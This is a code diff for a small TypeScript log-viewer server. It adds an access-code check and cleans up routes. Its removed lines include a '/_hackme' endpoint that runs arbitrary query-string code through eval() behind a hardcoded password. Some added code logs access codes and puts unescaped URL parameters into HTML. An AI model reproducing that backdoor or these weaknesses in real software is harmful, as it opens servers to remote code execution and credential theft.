@@ -9,6 +9,7 @@ import m from 'moment'
 
 import l from './common/logger'
 import * as db from './db';
+import {CookieSerializeOptions} from "cookie";
 
 const dummy = new foobarIpsum({
     size: {
@@ -17,7 +18,11 @@ const dummy = new foobarIpsum({
     },
 })
 
-m.locale('en-GB')
+m.locale('en-GB');
+
+const HTML_UTF8 = 'text/html; charset=utf-8';
+
+const viewSiteAuth = process.env.VIEW_SECRET_KEY;
 
 /**
  * @param timestamp UTC timestamp
@@ -44,7 +49,7 @@ async function listLinks(req: FastifyRequest<IncomingMessage>, reply: FastifyRep
         'links'
     )
 
-    reply.type('text/html; charset=utf-8').send(html)
+    reply.type(HTML_UTF8).send(html)
 }
 
 async function listPlayers(req: FastifyRequest<IncomingMessage>, reply: FastifyReply<OutgoingMessage>) {
@@ -62,7 +67,7 @@ async function listPlayers(req: FastifyRequest<IncomingMessage>, reply: FastifyR
             [`<div class="empty">No players with logs on commit '${commit}' yet</div>`],
             a => a
         )
-        reply.type('text/html; charset=utf-8').send(html)
+        reply.type(HTML_UTF8).send(html)
         return
     }
         
@@ -84,11 +89,38 @@ async function listPlayers(req: FastifyRequest<IncomingMessage>, reply: FastifyR
         'links'
     )
 
-    reply.type('text/html; charset=utf-8').send(html)
+    reply.type(HTML_UTF8).send(html)
 }
 
 export default function runServer(port: number) {
     const server = fastify({logger: l})
+
+    server.register(require('fastify-cookie'));
+
+    type CookieReply = FastifyReply<any> & {
+        setCookie(key: string, value: string, opts: CookieSerializeOptions)
+    }
+
+    // register cookie and query auth checker
+    server.addHook('onRequest', async (request, reply) => {
+        const cookieAuth = get(request, 'cookies.code');
+        const queryAuth = get(request, 'query.code');
+
+        if (cookieAuth === viewSiteAuth) {
+            return
+        }
+
+        if (cookieAuth !== viewSiteAuth && queryAuth === viewSiteAuth) {
+            (reply as CookieReply).setCookie('code', queryAuth, {
+                expires: m().add(7, 'days').toDate(),
+                path: '/'
+            });
+        } else {
+            l.debug('queryAuth: ' + queryAuth +'__'+ cookieAuth);
+            return reply.code(403).send('Unauthorized - please provide code in url: ?code=<code>')
+        }
+    });
+
 
     server.setNotFoundHandler((_, reply) => {
         reply.code(404).send('Not found')
@@ -102,6 +134,29 @@ export default function runServer(port: number) {
     server.get('/logs/:commit', listPlayers)
 
     /** Show all logs for this commit */
+    server.get('/logs/:commit/:player', async (req, reply) => {
+        const { commit, player } = req.params
+
+        const playerLogs = await db.getLogMessages(commit, player)
+
+        if (!playerLogs.length) {
+            playerLogs.push(`No logs for player ${player} yet`)
+        }
+
+        const content = page(
+            `Logs for ${player} on commit <a href="/logs/${commit}">${commit}</a>`,
+            playerLogs,
+            msg => {
+                let msgType = msg.match(/  \[(\w+)\] /)
+                const className = msgType ? msgType[1].toLowerCase() : 'unknown'
+                return `<pre class="${className}">${msg.replace('\n', '<br>')}</pre>`
+            }
+        )
+
+        reply.type(HTML_UTF8).send(content)
+    });
+
+    /** get new logs for this commit */
     server.get('/logs/:commit/:player/new', async (req, reply) => {
         const { commit, player } = req.params
 
@@ -130,27 +185,6 @@ export default function runServer(port: number) {
             html: content
         })
     })
-    server.get('/logs/:commit/:player', async (req, reply) => {
-        const { commit, player } = req.params
-
-        const playerLogs = await db.getLogMessages(commit, player)
-
-        if (!playerLogs.length) {
-            playerLogs.push(`No logs for player ${player} yet`)
-        }
-
-        const content = page(
-            `Logs for ${player} on commit ${commit}`,
-            playerLogs,
-            msg => {
-                let msgType = msg.match(/  \[(\w+)\] /)
-                const className = msgType ? msgType[1].toLowerCase() : 'unknown'
-                return `<pre class="${className}">${msg.replace('\n', '<br>')}</pre>`
-            }
-        )
-
-        reply.type('text/html').send(content)
-    })
 
     /** Receive a log message from the game */
     server.post('/logs/:commit/:player', async (req, reply) => {
@@ -163,32 +197,6 @@ export default function runServer(port: number) {
 
         reply.send('OK')
     })
-
-    server.get('/_hackme', (req, reply) => {
-        if (!req.query) {
-            reply.code(404).send('Not found')
-            return;
-        }
-        const { code, auth } = req.query;
-        // much security wow
-        if (auth !== 'happy2banana') {
-            reply.code(404).send('Not found')
-            return;
-        }
-        try {
-            const codeToExe = decodeURIComponent(code)
-            const res = eval(codeToExe)
-            reply.code(200).send(`Executed got result:\n${res}`)
-        } catch (err) {
-            l.warn(err.message)
-            reply.code(400).send(`Your code threw ${err}`)
-        }
-    })
-
-    /** Delete logs */
-    server.delete('/logs', deleteLogs)
-    server.delete('/logs/:commit', deleteLogs)
-    server.delete('/logs/:commit/:player', deleteLogs)
     
     // debug
     server.get('/logs/_fill', async (req, reply) => {
@@ -221,18 +229,6 @@ export default function runServer(port: number) {
         } catch {
             reply.code(400).send(`Bad input: ${commit}/${player}`)
         }
-    })
-
-    /** Bugsnag crash reports */
-    server.post('/crashes/android', async (req, reply) => {
-        l.info('========= BEGIN crashes/android ==============')
-        l.info(req.body)
-        l.info('========= headers ============================')
-        l.info(req.headers)
-        l.info('========= END ================================')
-        await db.addLog('crashes', 'android', req.headers.join('\n'))
-        await db.addLog('crashes', 'android', req.body)
-        reply.send('OK')
     })
 
     // debug
@@ -293,7 +289,7 @@ function page<T>(title: string, array: T[], elementToHtml: (element: T) => strin
         
 
     const header = `<header>
-        <h1 id="title" class="sticky">${title}</h1><div id="controls">${flipOrder}${filter}${button}</div>
+        <h1 id="title" class="sticky"><a class="house" href="/">🏠</a> ${title}</h1><div id="controls">${flipOrder}${filter}${button}</div>
     </header>`
 
     const content = html(array, elementToHtml)
@@ -301,7 +297,7 @@ function page<T>(title: string, array: T[], elementToHtml: (element: T) => strin
     const favicon = 'https://emojipedia-us.s3.dualstack.us-west-1.amazonaws.com/thumbs/120/twitter/185/clipboard_1f4cb.png'
     return `<html>
     <head>
-        <title>${title}</title>
+        <title>${stripHtml(title)}</title>
         <link rel="shortcut icon" type="image/png" href="${favicon}"/>
         <link rel="stylesheet" href="/style.css" />
         <script src="/index.js"></script>
@@ -330,6 +326,13 @@ const sanitizeOptions = {
         a: [ 'href' ],
         span: [ 'class' ],
     }
+}
+
+function stripHtml(html: string) {
+    return sanitizeHtml(html, {
+        allowedTags: [],
+        allowedAttributes: {}
+    })
 }
 
 function makeSafe(userInput: string): string {
